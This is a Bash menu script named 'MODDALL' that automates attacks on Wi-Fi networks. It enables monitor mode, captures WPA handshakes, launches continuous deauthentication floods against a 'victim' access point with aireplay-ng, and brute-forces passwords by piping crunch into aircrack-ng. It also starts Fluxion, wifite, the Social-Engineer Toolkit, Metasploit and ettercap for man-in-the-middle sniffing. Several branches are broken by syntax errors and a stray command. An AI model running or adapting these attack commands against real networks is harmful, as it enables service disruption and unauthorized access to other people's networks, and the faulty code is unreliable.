#!/bin/bash 
clear
echo "$(tput setaf 6) 
    __  ___  ____    ____    ____    ___      __      __
   /  |/  / / __ \  / __ \  / __ \  /   |    / /     / / 
  / /|_/ / / / / / / / / / / / / / / /| |   / /     / /  
 / /  / / / /_/ / / /_/ / / /_/ / / ___ |  / /___  / /___
/_/  /_/  \____/ /____/  /____/  /_/  |_/ /_____/ /_____/ 

" 
RED='\033[31m'
echo "$(tput setaf 2) Version 1.9"
NC='\033[0m'
echo "$(tput setaf 3) Select from menu:"
echo''
echo	"        $(tput setaf 1)1) Airodump"
echo 	'	2) Fluxion  '
echo	'	3) Wifite   '
echo 	'	4) Social Engineering '
echo 	'	5) Metasploit '
echo    '        6) Password Lists '
echo    '        7) Deauthing Attacks ' 
echo    '        8) Sniffing/MITM Attacks ' 
echo    '        9) Data Sniffer '
echo    '       10) Passwort cracking '


echo 
read EINGABE 
if test $EINGABE = "1"   
  then 
   clear
   EINGABEZ=" "
   echo "$(tput setaf 6)
    __  ___  ____    ____    ____    ___      __      __
   /  |/  / / __ \  / __ \  / __ \  /   |    / /     / / 
  / /|_/ / / / / / / / / / / / / / / /| |   / /     / /  
 / /  / / / /_/ / / /_/ / / /_/ / / ___ |  / /___  / /___
/_/  /_/  \____/ /____/  /____/  /_/  |_/ /_____/ /_____/ 

"
   echo
   echo "$(tput setaf 3)1) Turn monitor Mode on"
   echo '2) Turn monitor Mode off'
   echo '3) Scan for ACPs'
   echo '4) Target scan an ACP'
   echo '5) Get Capture File '
   echo
   read EINGABEZ
   if test $EINGABEZ = "1"
     then
     clear
     airmon-ng start wlan0
     clear
     echo ' .d8b.   .o88b. d888888b d888888b db    db d888888 '
     echo 'd8   8b d8P  Y8  ~~88~~     88    88    88 88      '
     echo '88ooo88 8P         88       88    Y8    8P 88ooooo '
     echo '88~~~88 8b         88       88     8b  d8  88~~~~ '
     echo '88   88 Y8b  d8    88      .88.     8bd8   88.     '
     echo 'YP   YP   Y88P     YP    Y888888P    YP    Y888888 '
     sleep 3
     cd Desktop
     ./MODDALL.sh
     
fi 
   if test $EINGABEZ = "2"
     then 
     clear
     airmon-ng stop wlan0mon
     clear
     echo ' .d88b.  d88888b d88888b '
     echo '.8P  Y8. 88      88      '
     echo '88    88 88ooo   88ooo   '
     echo '88    88 88~~~   88~~~   '
     echo ' 8b  d8  88      88      '
     echo '  Y88P   YP      YP      '
     sleep 3
     cd Desktop
     ./MODDALL.sh
fi
   if test $EINGABEZ = "3"
     then
     clear
     airmon-ng start wlan0
     clear
     
     sleep 0.01 && echo 
           sleep 0.25 && echo "     /\    |_   _| |  __ \   / __ \  |  __ \  | |  | | |  \/  | |  __ \    "
	   sleep 0.25 && echo "    /  \     | |   | |__| \ | |  | | | |  | | | |  | | | \  / | | |__) |    "
	   sleep 0.25 && echo "   / /\ \    | |   |  _  /  | |  | | | |  | | | |  | | | |\/| | |  ___/    "
	   sleep 0.25 && echo "  / ____ \  _| |_  | | \ \  | |__| | | |__| | | |__| | | |  | | | |    "
	   sleep 0.25 && echo " /_/    \_\ _____  |_|  \_\  \____/  |_____/   \____/  |_|  |_| |_|    "
                         echo
                         echo
	   sleep 0.25 && echo " You usally need the BSSID and Channel of the AP for attacking "
     sleep 2

     airodump-ng wlan0mon
     
fi
    if test $EINGABEZ = "4"
     then
     clear
     echo "
    __  ___  ____    ____    ____    ___      __      __
   /  |/  / / __ \  / __ \  / __ \  /   |    / /     / / 
  / /|_/ / / / / / / / / / / / / / / /| |   / /     / /  
 / /  / / / /_/ / / /_/ / / /_/ / / ___ |  / /___  / /___
/_/  /_/  \____/ /____/  /____/  /_/  |_/ /_____/ /_____/ 

"
     echo Put in the BSSID!
     read EINGABEZ3
     echo 'Put in the Channel!'
     read EINGABEZ4
     airodump-ng -c $EINGABEZ4 --bssid $EINGABEZ3 wlan0mon
     
fi
    if test $EINGABEZ = "5"
      then 
      clear
      xterm -e airodump-ng wlan0mon &
      echo Put in the Wifi BSSID
      read WIFIBSSID
      echo Put in the Wifi CHANNEL
      read WIFICHANNEL
      echo Put in the Interface
      read WIFIHACKINTERFACE
      echo The Cap File will be saved to Desktop
      sleep 5
      echo When the Airodump starts you can start a Deauth Attack to fast up the Procces
      xterm -e airodump-ng -c $WIFICHANNEL --bssid $WIFIBSSID -w /root/Desktop/ $WIFIHACKINTERFACE &
      ./MODDALL.sh
fi
fi
   if test $EINGABE = "2"   
    then 
    clear
    echo "
    __  ___  ____    ____    ____    ___      __      __
   /  |/  / / __ \  / __ \  / __ \  /   |    / /     / / 
  / /|_/ / / / / / / / / / / / / / / /| |   / /     / /  
 / /  / / / /_/ / / /_/ / / /_/ / / ___ |  / /___  / /___
/_/  /_/  \____/ /____/  /____/  /_/  |_/ /_____/ /_____/ 

"
   echo Did you already install Fluxion?
   echo '1) Yes '
   echo '2) No  '
   echo '3) Problems'
   read EINGABEFE
   if test $EINGABEFE = "1"
    then 
    cd fluxion
    ./fluxion.sh
fi
   if test $EINGABEFE = "2" 
    then 
    git clone https://github.com/FluxionNetwork/fluxion.git
fi
   if test $EINGABEFE = "3"
    then 
    clear
    echo "If there were any problems try ./fluxion -i"
    read -p "Press any key to retry fluxion"
    cd fluxion
    ./fluxion.sh -i
fi
    
fi

   if test $EINGABE = "3"   
    then 
    wifite  
fi

   if test $EINGABE = "help"   
    then 
    clear
    echo Why the fuck would you need help here?
    echo Please go and delete your Sys 32
fi

   if test $EINGABE = "4"   
    then 
    setoolkit 
fi

   if test $EINGABE = "5"   
   then 
   msfconsole
fi

   if test $EINGABE = "8"
    then 
    clear
    echo "
    __  ___  ____    ____    ____    ___      __      __
   /  |/  / / __ \  / __ \  / __ \  /   |    / /     / / 
  / /|_/ / / / / / / / / / / / / / / /| |   / /     / /  
 / /  / / / /_/ / / /_/ / / /_/ / / ___ |  / /___  / /___
/_/  /_/  \____/ /____/  /____/  /_/  |_/ /_____/ /_____/ 

"
   echo '1) Package Sniffing Wireshark (reccomended for begginers) ' 
   echo '2) Sniffing with Ettercap '
   echo '3) Netsniff (for pros)'
   read $EINGABENSEEE
   
   if test $EINGABENSEEE ="2"
    then
    echo 'Please select an Userinterface!'
    echo 'Wireless...usally wlan0'
    echo 'Wired......usallt eth0'
    echo     echo 'Do you want to check your interfaces?'
    echo '1) Yes'
    echo '2) No'
    read INTERFACECHECK
fi
   if test $INTERFACECHECK = "1"
    then 
    ifconfig
    echo 
    echo 
    echo 'So! Which one do you want to use?'
    read USERINTERFACE 
    ettercap -i $USERINTERFACE
fi

fi

   if test $EINGABE = "9"
    then 
    wireshark
    ./MODDALL.sh
fi

   if test $EINGABE = "6"
    then 
    xterm&
    
fi

   if test $EINGABE = "7"
    then 
    echo "
    __  ___  ____    ____    ____    ___      __      __
   /  |/  / / __ \  / __ \  / __ \  /   |    / /     / / 
  / /|_/ / / / / / / / / / / / / / / /| |   / /     / /  
 / /  / / / /_/ / / /_/ / / /_/ / / ___ |  / /___  / /___
/_/  /_/  \____/ /____/  /____/  /_/  |_/ /_____/ /_____/ 

"
   airmon-ng start wlan0
    clear
    echo "$(tput setaf 6)
    __  ___  ____    ____    ____    ___      __      __
   /  |/  / / __ \  / __ \  / __ \  /   |    / /     / / 
  / /|_/ / / / / / / / / / / / / / / /| |   / /     / /  
 / /  / / / /_/ / / /_/ / / /_/ / / ___ |  / /___  / /___
/_/  /_/  \____/ /____/  /____/  /_/  |_/ /_____/ /_____/ 

"
    echo
    echo "$(tput setaf 3)Are you already airodumping (Scanning) the victims Wifi?"
    echo '1) Yes'
    echo '2) No'
    read SCANNING
    
    if test $SCANNING = "2"
    then 
    clear
    echo 
    echo ' 1) Airodump the victim'
    echo ' 2) Back to main'
    read DMAIN
    if test $DMAIN = "2"
     then 
     ./MODDALL.sh
fi
   if test $DMAIN = "1"
    then 
    gnome-terminal --geometry 100x20+0+999999 -e ./AIRODUMP.sh
    clear
    echo "$(tput setaf 6)
    __  ___  ____    ____    ____    ___      __      __
   /  |/  / / __ \  / __ \  / __ \  /   |    / /     / / 
  / /|_/ / / / / / / / / / / / / / / /| |   / /     / /  
 / /  / / / /_/ / / /_/ / / /_/ / / ___ |  / /___  / /___
/_/  /_/  \____/ /____/  /____/  /_/  |_/ /_____/ /_____/ 

"
    echo
    echo "$(tput setaf 3)Put in the BSSID"
    read BSSIDXTDE
    clear
    echo "$(tput setaf 6)
    __  ___  ____    ____    ____    ___      __      __
   /  |/  / / __ \  / __ \  / __ \  /   |    / /     / / 
  / /|_/ / / / / / / / / / / / / / / /| |   / /     / /  
 / /  / / / /_/ / / /_/ / / /_/ / / ___ |  / /___  / /___
/_/  /_/  \____/ /____/  /____/  /_/  |_/ /_____/ /_____/ 

"
    echo
    echo "WAIT! BEFORE YOU PUT IN THE CHANNEL CLOSE THE SMALL WINDOW WICH OPENED A FEW MOMENTS AGO!"
    echo "$(tput setaf 3)Put in the CHANNEL"
    read CHANNELXTDE
    xterm -e airodump-ng -c $CHANNELXTDE --bssid $BSSIDXTDE wlan0mon &
    echo Now that you are airodumping the victim you can also deauth it
    echo ATTACK STARTS!
    sleep 5
       
    xterm -e aireplay-ng --deauth 0 -a $BSSIDXTDE wlan0mon &
    clear
    echo "

  _____    ______              _    _   _______   _    _   _____   _   _    _____ 
 |  __ \  |  ____|     /\     | |  | | |__   __| | |  | | |_   _| | \ | |  / ____|
 | |  | | | |__       /  \    | |  | |    | |    | |__| |   | |   |  \| | | |  __ 
 | |  | | |  __|     / /\ \   | |  | |    | |    |  __  |   | |   | . | | | | |_ |
 | |__| | | |____   / ____ \  | |__| |    | |    | |  | |  _| |_  | |\  | | |__| |
 |_____/  |______| /_/    \_\  \____/     |_|    |_|  |_| |_____| |_| \_|  \_____|
                                                                                  
                                                                                  

"

   sleep 3
   bed
fi
    
fi
   if test $SCANNING = "1"
    then 
    echo Put in the BSSID
    read BSSIDDE 
    xterm -e aireplay-ng --deauth 0 -a $BSSIDDE wlan0mon &
    echo "

  _____    ______              _    _   _______   _    _   _____   _   _    _____ 
 |  __ \  |  ____|     /\     | |  | | |__   __| | |  | | |_   _| | \ | |  / ____|
 | |  | | | |__       /  \    | |  | |    | |    | |__| |   | |   |  \| | | |  __ 
 | |  | | |  __|     / /\ \   | |  | |    | |    |  __  |   | |   | . | | | | |_ |
 | |__| | | |____   / ____ \  | |__| |    | |    | |  | |  _| |_  | |\  | | |__| |
 |_____/  |______| /_/    \_\  \____/     |_|    |_|  |_| |_____| |_| \_|  \_____|
                                                                                  
                                                                                  

"
fi
fi

   if test $EINGABE = "10"
    then 
    airmon-ng start wlan0
    clear
    echo "
  ___  _____  _____  _____  _   __ _____   ___   _____  _   __ 
 / _ \|_   _|| ___ \/  __ \| | / /| ___ \ / _ \ /  __ \| | / / 
/ /_\ \ | |  | |_/ /| /  \/| |/ / | |_/ // /_\ \| /  \/| |/ /  
|  _  | | |  |    / | |    |    \ |    / |  _  || |    |    \  
| | | |_| |_ | |\ \ | \__/\| |\  \| |\ \ | | | || \__/\| |\  \ 
\_| |_/\___/ \_| \_| \____/\_| \_/\_| \_|\_| |_/ \____/\_| \_/ 
"                                                                                            
    echo Do you know how to work with crunch and airckrack?
    echo '1) Yes '
    echo '2) No'
    read DPAE
    if test $DPAE = "1"
     then
     clear
     echo "
  ___  _____  _____  _____  _   __ _____   ___   _____  _   __ 
 / _ \|_   _|| ___ \/  __ \| | / /| ___ \ / _ \ /  __ \| | / / 
/ /_\ \ | |  | |_/ /| /  \/| |/ / | |_/ // /_\ \| /  \/| |/ /  
|  _  | | |  |    / | |    |    \ |    / |  _  || |    |    \  
| | | |_| |_ | |\ \ | \__/\| |\  \| |\ \ | | | || \__/\| |\  \ 
\_| |_/\___/ \_| \_| \____/\_| \_/\_| \_|\_| |_/ \____/\_| \_/ 
" 
     echo From
     echo Example 5 to 9
     read WORTERUSW
     clear
     echo "
  ___  _____  _____  _____  _   __ _____   ___   _____  _   __ 
 / _ \|_   _|| ___ \/  __ \| | / /| ___ \ / _ \ /  __ \| | / / 
/ /_\ \ | |  | |_/ /| /  \/| |/ / | |_/ // /_\ \| /  \/| |/ /  
|  _  | | |  |    / | |    |    \ |    / |  _  || |    |    \  
| | | |_| |_ | |\ \ | \__/\| |\  \| |\ \ | | | || \__/\| |\  \ 
\_| |_/\___/ \_| \_| \____/\_| \_/\_| \_|\_| |_/ \____/\_| \_/ 
" 
     echo To
     echo Example 5 to 9
     read WORTERUSWZ
     clear
     echo "
  ___  _____  _____  _____  _   __ _____   ___   _____  _   __ 
 / _ \|_   _|| ___ \/  __ \| | / /| ___ \ / _ \ /  __ \| | / / 
/ /_\ \ | |  | |_/ /| /  \/| |/ / | |_/ // /_\ \| /  \/| |/ /  
|  _  | | |  |    / | |    |    \ |    / |  _  || |    |    \  
| | | |_| |_ | |\ \ | \__/\| |\  \| |\ \ | | | || \__/\| |\  \ 
\_| |_/\___/ \_| \_| \____/\_| \_/\_| \_|\_| |_/ \____/\_| \_/ 
" 
     echo Letters
     
     read LETTERSANG
     clear 
     echo "
  ___  _____  _____  _____  _   __ _____   ___   _____  _   __ 
 / _ \|_   _|| ___ \/  __ \| | / /| ___ \ / _ \ /  __ \| | / / 
/ /_\ \ | |  | |_/ /| /  \/| |/ / | |_/ // /_\ \| /  \/| |/ /  
|  _  | | |  |    / | |    |    \ |    / |  _  || |    |    \  
| | | |_| |_ | |\ \ | \__/\| |\  \| |\ \ | | | || \__/\| |\  \ 
\_| |_/\___/ \_| \_| \____/\_| \_/\_| \_|\_| |_/ \____/\_| \_/ 
"  
     echo Location of the cap File
     echo "WARNING! PLEASE WITHOUT ANY '"
     echo If you dont have a Cap File yet type 1
     read LOCATIONCF
     if test $LOCATIONCF = "1"
      then 
      clear 
      echo "
  ___  _____  _____  _____  _   __ _____   ___   _____  _   __ 
 / _ \|_   _|| ___ \/  __ \| | / /| ___ \ / _ \ /  __ \| | / / 
/ /_\ \ | |  | |_/ /| /  \/| |/ / | |_/ // /_\ \| /  \/| |/ /  
|  _  | | |  |    / | |    |    \ |    / |  _  || |    |    \  
| | | |_| |_ | |\ \ | \__/\| |\  \| |\ \ | | | || \__/\| |\  \ 
\_| |_/\___/ \_| \_| \____/\_| \_/\_| \_|\_| |_/ \____/\_| \_/ 
"
      echo Another window will open now to get the Cap file
      echo The Cap file will be safed into the MODDALL folder
      echo 
      echo Now put in the BSSID 
      read BSSIDSSIDSS
      echo 
      echo Now put in the CHANNEL
      read CHANNELCHANNEL
      xterm -e airodump-ng -c $CHANNELCHANNEL --bssid $BSSIDSSIDSS -w /root/Videos/MODDALL/ wlan0mon &
      clear
      echo Put in the Cap File Location
      read LOCATIONCFFFF
      crunch $WORTERUSW $WORTERUSWZ $LETTERSANG | aircrack-ng -a 2 $LOCATIONCFFFF -b $BSSIDSSIDSS -w-
      ./MODDALL.sh

fi
      echo "
  ___  _____  _____  _____  _   __ _____   ___   _____  _   __ 
 / _ \|_   _|| ___ \/  __ \| | / /| ___ \ / _ \ /  __ \| | / / 
/ /_\ \ | |  | |_/ /| /  \/| |/ / | |_/ // /_\ \| /  \/| |/ /  
|  _  | | |  |    / | |    |    \ |    / |  _  || |    |    \  
| | | |_| |_ | |\ \ | \__/\| |\  \| |\ \ | | | || \__/\| |\  \ 
\_| |_/\___/ \_| \_| \____/\_| \_/\_| \_|\_| |_/ \____/\_| \_/ 
" 
     clear
     echo BSSID
     read ANGBSSID
     echo "
  ___  _____  _____  _____  _   __ _____   ___   _____  _   __ 
 / _ \|_   _|| ___ \/  __ \| | / /| ___ \ / _ \ /  __ \| | / / 
/ /_\ \ | |  | |_/ /| /  \/| |/ / | |_/ // /_\ \| /  \/| |/ /  
|  _  | | |  |    / | |    |    \ |    / |  _  || |    |    \  
| | | |_| |_ | |\ \ | \__/\| |\  \| |\ \ | | | || \__/\| |\  \ 
\_| |_/\___/ \_| \_| \____/\_| \_/\_| \_|\_| |_/ \____/\_| \_/ 
"  
     
     crunch $WORTERUSW $WORTERUSWZ $LETTERSANG | aircrack-ng -a 2 $LOCATIONCF -b $ANGBSSID -w-
     ./MODDALL.sh
     
     
fi
   else
   clear
   echo This is not a valid value!
   echo MODDALL will start again
   echo Press something
   read DASKLEINEEINMALEINS
    echo 3
    sleep 0.25
    echo 2
    sleep 0.25
    echo 1
    sleep 0.25
   ./MODDALL.sh
fi
fi
    
